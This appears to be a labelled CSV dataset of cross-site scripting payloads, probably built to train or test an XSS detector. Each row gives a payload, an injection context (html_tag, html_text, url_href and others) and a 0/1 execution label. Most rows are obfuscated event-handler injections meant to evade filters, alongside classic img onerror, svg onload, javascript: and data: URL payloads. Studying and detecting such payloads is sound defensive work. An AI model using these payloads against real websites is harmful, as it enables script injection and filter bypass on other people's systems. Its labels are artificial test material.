payload,context,exec,combined
<D3v/+/oNMOuSEOver+=+(confirm)()>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v/+/oNMOuSEOver+=+(confirm)()>v3dm0s
<hTmL/+/oNPoiNtErENtEr+=+(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <hTmL/+/oNPoiNtErENtEr+=+(prompt)``%0dx>
<HtML/+/oNpOIntErenteR%0a=%0a(confirm)()//,html_tag,0,CONTEXT_html_tag <HtML/+/oNpOIntErenteR%0a=%0a(confirm)()//
<a%0dOnpOINTerEnteR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dOnpOINTerEnteR%09=%09(prompt)``%0dx>v3dm0s
<><><>,html_text,0,CONTEXT_html_text <><><>
<A/+/ONpointEreNTEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONpointEreNTEr%0d=%0dconfirm()%0dx>v3dm0s
"<A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <A%0donmOuseovEr%0d=%0da=prompt,a()>v3dm0s"
<DeTAILs/+/oNtoGgLe+=+confirm()//,html_text,0,CONTEXT_html_text <DeTAILs/+/oNtoGgLe+=+confirm()//
<a%09OnMouseOveR%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnMouseOveR%09=%09[8].find(confirm)>v3dm0s
<DEtAils/+/ONTOGGlE%09=%09confirm()%0dx>,html_tag,0,CONTEXT_html_tag <DEtAils/+/ONTOGGlE%09=%09confirm()%0dx>
"<deTails%09OntOggLe%09=%09a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <deTails%09OntOggLe%09=%09a=prompt,a()%0dx//"
<D3V%09ONmousEOvER%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09ONmousEOvER%0a=%0aconfirm()>v3dm0s
<D3v/+/OnPoINtEreNtEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/OnPoINtEreNtEr%0d=%0d[8].find(confirm)>v3dm0s
<dEtaIlS%0aoNTOGgLe+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <dEtaIlS%0aoNTOGgLe+=+confirm()%0dx>
"<A%0aOnpOINTEreNtER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A%0aOnpOINTEreNtER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<dEtaIls%09onTOGGLE%09=%09(confirm)()%0dx//,html_text,0,CONTEXT_html_text <dEtaIls%09onTOGGLE%09=%09(confirm)()%0dx//
<A%0aoNMoUsEover%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNMoUsEover%0a=%0aconfirm()%0dx>v3dm0s
<D3V/+/onpOINteRenter%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V/+/onpOINteRenter%09=%09[8].find(confirm)>v3dm0s
<D3v%0doNmoUseoveR%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0doNmoUseoveR%0a=%0a(prompt)``>v3dm0s
<img src=1 onerror=alert(1)>,html_tag,1,CONTEXT_html_tag <img src=1 onerror=alert(1)>
<a%0aonMouSEoVER%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%0aonMouSEoVER%0d=%0dconfirm()%0dx>v3dm0s
<A%0donmOusEoVeR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0donmOusEoVeR%0d=%0dconfirm()>v3dm0s
<A/+/OnpOInteRENter%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnpOInteRENter%09=%09confirm()%0dx>v3dm0s
&#60;tag&#62;,html_text,0,CONTEXT_html_text &#60;tag&#62;
<a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s,url_href,0,CONTEXT_url_href <a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s
<d3v%0aONMoUsEoVEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aONMoUsEoVEr%0d=%0dconfirm()%0dx>v3dm0s
<html/+/oNpOiNteReNTER%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <html/+/oNpOiNteReNTER%0a=%0aconfirm()%0dx>
<DEtAILs/+/ONPoiNTerENTER+=+confirm()>,html_text,0,CONTEXT_html_text <DEtAILs/+/ONPoiNTerENTER+=+confirm()>
<D3v%0dONPOInTerentER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0dONPOInTerentER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A/+/onPoIntEREnTeR%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A/+/onPoIntEREnTeR%0a=%0aconfirm()>v3dm0s
"<HtML%0aOnmoUSeoVer%0a=%0aa=prompt,a()>",html_text,0,"CONTEXT_html_text <HtML%0aOnmoUSeoVer%0a=%0aa=prompt,a()>"
<DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>,html_text,0,CONTEXT_html_text <DETaILs/+/ONtoGGLE%09=%09(prompt)``%0dx>
<HTML%0aoNpoinTerENTeR+=+(prompt)``//,html_tag,0,CONTEXT_html_tag <HTML%0aoNpoinTerENTeR+=+(prompt)``//
<a%0doNmoUSeOVer%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0doNmoUSeOVer%0a=%0a(confirm)()%0dx>v3dm0s
<hTMl/+/ONMOUSEOver+=+(prompt)``//,html_text,0,CONTEXT_html_text <hTMl/+/ONMOUSEOver+=+(prompt)``//
<dEtaILS/+/OnPOiNtErentER%09=%09confirm()>,html_text,0,CONTEXT_html_text <dEtaILS/+/OnPOiNtErentER%09=%09confirm()>
<d3v%0doNPOInTERENTeR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0doNPOInTERENTeR%0d=%0d(confirm)()%0dx>v3dm0s
<A/+/OnMOuSeoVeR%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnMOuSeoVeR%0a=%0aconfirm()%0dx>v3dm0s
<dEtaiLs/+/OnToggle%09=%09[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <dEtaiLs/+/OnToggle%09=%09[8].find(confirm)%0dx//
<a%0donpoInTerENtER+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <a%0donpoInTerENtER+=+confirm()>v3dm0s
<d3V/+/ONMOUsEoVer%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/ONMOUsEoVer%09=%09confirm()%0dx>v3dm0s
<dETailS%0aoNpoinTeReNTER%09=%09(confirm)()>,html_tag,0,CONTEXT_html_tag <dETailS%0aoNpoinTeReNTER%09=%09(confirm)()>
<HTML/+/onMOuSeOver%0d=%0d(prompt)``>,html_tag,0,CONTEXT_html_tag <HTML/+/onMOuSeOver%0d=%0d(prompt)``>
plaininput,html_text,0,CONTEXT_html_text plaininput
disabled=false,html_text,0,CONTEXT_html_text disabled=false
<a/+/OnmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnmOusEoVEr%0d=%0d[8].find(confirm)%0dx>v3dm0s
<D3V/+/OnPOintErenTEr%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/OnPOintErenTEr%0a=%0a(prompt)``%0dx>v3dm0s
<deTAiLS%0doNTOGGLe%0d=%0d(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <deTAiLS%0doNTOGGLe%0d=%0d(confirm)()%0dx//
<A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09onpointEREnTer%0d=%0dconfirm()%0dx>v3dm0s
<d3V%0dOnPoinTEReNTeR%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0dOnPoinTEReNTeR%09=%09(prompt)``>v3dm0s
onblur=alert(1),html_tag,0,CONTEXT_html_tag onblur=alert(1)
<a/+/ONpOiNteREnter%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/ONpOiNteREnter%0a=%0aconfirm()%0dx>v3dm0s
<A%0aOnpoIntEReNTER+=+(confirm)()>v3dm0s,html_text,0,CONTEXT_html_text <A%0aOnpoIntEReNTER+=+(confirm)()>v3dm0s
<D3v/+/onmoUseovEr+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v/+/onmoUseovEr+=+(prompt)``>v3dm0s
<d3v/+/oNMOUSEoVer%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/oNMOUSEoVer%0d=%0d(confirm)()%0dx>v3dm0s
<D3V/+/ONpOintereNter+=+(confirm)()>v3dm0s,html_text,0,CONTEXT_html_text <D3V/+/ONpOintereNter+=+(confirm)()>v3dm0s
"<d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <d3v/+/ONMouSeover+=+a=prompt,a()>v3dm0s"
<DetAIls%0donpoinTeRENter%0a=%0a(prompt)``>,html_text,0,CONTEXT_html_text <DetAIls%0donpoinTeRENter%0a=%0a(prompt)``>
<d3v%0dONMOUsEOVeR%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0dONMOUsEOVeR%09=%09[8].find(confirm)>v3dm0s
<html%0aonpoInTERENtEr%0a=%0aconfirm()%0dx>,html_text,0,CONTEXT_html_text <html%0aonpoInTERENtEr%0a=%0aconfirm()%0dx>
'><svg/onload=alert(1)>,html_attribute,1,CONTEXT_html_attribute '><svg/onload=alert(1)>
<d3v%0aONpoInteRENtER%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aONpoInteRENtER%0d=%0d(confirm)()>v3dm0s
"<A%09ONpOInTeRenteR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A%09ONpOInTeRenteR%09=%09a=prompt,a()%0dx>v3dm0s"
<d3V%0aONpoinTERenter%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0aONpoinTERenter%09=%09confirm()%0dx>v3dm0s
<d3V/+/oNmOuSEOver%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/oNmOuSEOver%09=%09confirm()>v3dm0s
<deTaiLS%0aonTogGLe%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <deTaiLS%0aonTogGLe%0a=%0aconfirm()%0dx>
<D3V%09oNmOUseOVeR%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%09oNmOUseOVeR%09=%09(confirm)()>v3dm0s
<DeTaIls/+/ontOGgLe%09=%09confirm()>,html_tag,0,CONTEXT_html_tag <DeTaIls/+/ontOGgLe%09=%09confirm()>
<hTml%0donPOIntErENteR%09=%09[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <hTml%0donPOIntErENteR%09=%09[8].find(confirm)%0dx>
<scr<script>ipt>alert(1)</scr</script>ipt>,html_text,0,CONTEXT_html_text <scr<script>ipt>alert(1)</scr</script>ipt>
<Html%0doNmOUseoVeR%0d=%0d(prompt)``//,html_text,0,CONTEXT_html_text <Html%0doNmOUseoVeR%0d=%0d(prompt)``//
<D3v%0aOnpOiNtErEntER+=+(prompt)``%0dx>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0aOnpOiNtErEntER+=+(prompt)``%0dx>v3dm0s
<DETAilS%09ONtoggle%0d=%0dconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <DETAilS%09ONtoggle%0d=%0dconfirm()%0dx>
"<Html%09ONmousEoVEr+=+a=prompt,a()>",html_tag,0,"CONTEXT_html_tag <Html%09ONmousEoVEr+=+a=prompt,a()>"
<hTMl/+/ONMOUSEOver+=+(prompt)``//,html_tag,0,CONTEXT_html_tag <hTMl/+/ONMOUSEOver+=+(prompt)``//
<d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/ONpOinteRENtER%0d=%0d(prompt)``>v3dm0s
<HTML%09oNmouSEover%0a=%0a(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <HTML%09oNmouSEover%0a=%0a(prompt)``%0dx//
<a%09ONmoUSeOVEr%0d=%0d(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONmoUSeOVEr%0d=%0d(confirm)()>v3dm0s
<d3V/+/ONPOiNteReNTER%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/ONPOiNteReNTER%0d=%0d(prompt)``%0dx>v3dm0s
"data:text/html,<svg onload=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<svg onload=alert(1)>"
<A/+/onpOiNTereNTeR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/onpOiNTereNTeR%09=%09confirm()>v3dm0s
<htML/+/onmOusEovEr+=+(prompt)``%0dx>,html_text,0,CONTEXT_html_text <htML/+/onmOusEovEr+=+(prompt)``%0dx>
<D3v/+/OnmOUseovER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/OnmOUseovER%09=%09[8].find(confirm)%0dx>v3dm0s
<A%09oNpoinTERENtEr%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%09oNpoinTERENtEr%0d=%0d(confirm)()%0dx>v3dm0s
<D3v/+/ONMOuSeOVer%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONMOuSeOVer%09=%09[8].find(confirm)>v3dm0s
<DEtaILs%0aOntoGGLe%0a=%0a[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <DEtaILs%0aOntoGGLe%0a=%0a[8].find(confirm)%0dx>
<dEtailS/+/onpoInTeReNteR%0d=%0d[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <dEtailS/+/onpoInTeReNteR%0d=%0d[8].find(confirm)%0dx//
<hTMl%0donpOInterEnTeR+=+confirm()//,url_href,0,CONTEXT_url_href <hTMl%0donpOInterEnTeR+=+confirm()//
"<A/+/onmoUSEoVER%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A/+/onmoUSEoVER%09=%09a=prompt,a()%0dx>v3dm0s"
<a/+/ONMOUsEovER%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <a/+/ONMOUsEovER%09=%09(confirm)()>v3dm0s
<DetAils%09ONPoinTeRenTER+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <DetAils%09ONPoinTeRenTER+=+confirm()%0dx>
"<dETAiLS%0dONtogGLe+=+a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <dETAiLS%0dONtogGLe+=+a=prompt,a()//"
"<A/+/ONmOusEOVEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <A/+/ONmOusEOVEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<D3v%0aoNmoUsEovER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aoNmoUsEovER%0d=%0dconfirm()%0dx>v3dm0s
<D3V%0aonPOinTErENter+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3V%0aonPOinTErENter+=+[8].find(confirm)%0dx>v3dm0s
"<A%0aOnpOINTerenter%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aOnpOINTerenter%0a=%0aa=prompt,a()%0dx>v3dm0s"
<detAiLs%0aoNtogGle+=+confirm()//,html_tag,0,CONTEXT_html_tag <detAiLs%0aoNtogGle+=+confirm()//
""";alert(location);//",html_tag,0,"CONTEXT_html_tag "";alert(location);//"
<HtML/+/onPOIntereNtEr%09=%09(confirm)()%0dx>,html_tag,0,CONTEXT_html_tag <HtML/+/onPOIntereNtEr%09=%09(confirm)()%0dx>
<d3v%09oNpoiNtereNTeR+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <d3v%09oNpoiNtereNTeR+=+(prompt)``%0dx>v3dm0s
<d3V%09OnPOiNteRenTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09OnPOiNteRenTEr%0d=%0d(prompt)``%0dx>v3dm0s
<D3V%09onmOUSEOvEr%09=%09(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09onmOUSEOvEr%09=%09(prompt)``>v3dm0s
"<a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%09onpoinTeReNTer%09=%09a=prompt,a()%0dx>v3dm0s"
<A/+/OnmoUsEoVeR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/OnmoUsEoVeR%09=%09confirm()%0dx>v3dm0s
<D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s
"<A%0aOnpOINTEreNtER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aOnpOINTEreNtER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<body>,html_text,0,CONTEXT_html_text <body>
<D3v%0dONPoinTEreNtER+=+(prompt)``>v3dm0s,html_text,0,CONTEXT_html_text <D3v%0dONPoinTEreNtER+=+(prompt)``>v3dm0s
<html%0dOnpoinTEreNter%0a=%0aconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <html%0dOnpoinTEreNter%0a=%0aconfirm()%0dx>
javascript:confirm`1`,url_href,1,CONTEXT_url_href javascript:confirm`1`
<DEtailS%09ontOgGlE%09=%09(prompt)``%0dx//,html_text,0,CONTEXT_html_text <DEtailS%09ontOgGlE%09=%09(prompt)``%0dx//
<a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONPoiNTErEnTEr%09=%09confirm()%0dx>v3dm0s
<a%0aONMouseOVEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aONMouseOVEr%0d=%0dconfirm()%0dx>v3dm0s
<DEtaIlS%0aoNTogglE%09=%09confirm()%0dx>,html_text,1,CONTEXT_html_text <DEtaIlS%0aoNTogglE%09=%09confirm()%0dx>
<A%0aoNmOusEOVEr%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNmOusEOVEr%0d=%0dconfirm()>v3dm0s
<A/+/OnmoUsEoVeR%09=%09confirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnmoUsEoVeR%09=%09confirm()%0dx>v3dm0s
<hTMl%0aoNpointeREnter+=+[8].find(confirm)//,html_text,0,CONTEXT_html_text <hTMl%0aoNpointeREnter+=+[8].find(confirm)//
<a%0aoNmOusEovER%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNmOusEovER%0d=%0d(prompt)``%0dx>v3dm0s
<a%09onMouSEoVer%0a=%0aconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <a%09onMouSEoVer%0a=%0aconfirm()>v3dm0s
<a%09OnmOUsEOvEr%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnmOUsEOvEr%09=%09(prompt)``>v3dm0s
"data:text/html,<img src=x onerror=alert(1)>",url_navigation,1,"CONTEXT_url_navigation data:text/html,<img src=x onerror=alert(1)>"
<d3V/+/onpoinTeRenTeR%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V/+/onpoinTeRenTeR%09=%09[8].find(confirm)%0dx>v3dm0s
"<D3v/+/onPOiNTERentEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3v/+/onPOiNTERentEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<HtML%0aoNpOiNTereNTer%0a=%0aconfirm()%0dx//,html_text,0,CONTEXT_html_text <HtML%0aoNpOiNTereNTer%0a=%0aconfirm()%0dx//
<img src=x onerror=alert(location)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(location)>
<img src=x onerror=alert(navigator.userAgent)>,html_tag,1,CONTEXT_html_tag <img src=x onerror=alert(navigator.userAgent)>
<tag>,html_text,0,CONTEXT_html_text <tag>
<a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNMousEoveR%0d=%0d[8].find(confirm)%0dx>v3dm0s
"<d3v%0aONPoiNtERENTER+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <d3v%0aONPoiNtERENTER+=+a=prompt,a()>v3dm0s"
<a%0donpoInTERenTEr%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0donpoInTERenTEr%0a=%0aconfirm()>v3dm0s
<d3V%0dOnpoIntErEntEr%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnpoIntErEntEr%09=%09(confirm)()%0dx>v3dm0s
"<A%0aonMOUsEovER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aonMOUsEovER%0a=%0aa=prompt,a()%0dx>v3dm0s"
<HTml/+/onmouSeoVEr+=+confirm()>,html_tag,0,CONTEXT_html_tag <HTml/+/onmouSeoVEr+=+confirm()>
"<D3V%09oNmOUseOvEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V%09oNmOUseOvEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<dEtAIlS%0aoNtOgGlE%0d=%0dconfirm()>,html_tag,0,CONTEXT_html_tag <dEtAIlS%0aoNtOgGlE%0d=%0dconfirm()>
<Html%0donpoINTeREntER+=+confirm()>,html_tag,0,CONTEXT_html_tag <Html%0donpoINTeREntER+=+confirm()>
<d3v%0aONPoInteRENTer%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aONPoInteRENTer%09=%09confirm()%0dx>v3dm0s
<htmL%09ONPOinTEreNTEr+=+(prompt)``%0dx//,html_text,0,CONTEXT_html_text <htmL%09ONPOinTEreNTEr+=+(prompt)``%0dx//
<D3v%09onpOintEREnTeR%09=%09confirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09onpOintEREnTeR%09=%09confirm()>v3dm0s
<D3v%0dOnPOiNteRenteR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0dOnPOiNteRenteR%09=%09(prompt)``%0dx>v3dm0s
<hTml%09onPoInteReNTer%0d=%0d(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <hTml%09onPoInteReNTer%0d=%0d(prompt)``%0dx//
"<D3v/+/onmOUseOvER+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <D3v/+/onmOUseOvER+=+a=prompt,a()>v3dm0s"
<hTml%0dONPoIntErentER%0d=%0d[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <hTml%0dONPoIntErentER%0d=%0d[8].find(confirm)%0dx//
"<html%0aONpOIntEreNTER%0d=%0da=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <html%0aONpOIntEreNTER%0d=%0da=prompt,a()%0dx>"
<html%0aoNmOusEOver%09=%09[8].find(confirm)>,html_text,0,CONTEXT_html_text <html%0aoNmOusEOver%09=%09[8].find(confirm)>
<DETAils/+/ONPoInTEREntER+=+[8].find(confirm)>,html_text,0,CONTEXT_html_text <DETAils/+/ONPoInTEREntER+=+[8].find(confirm)>
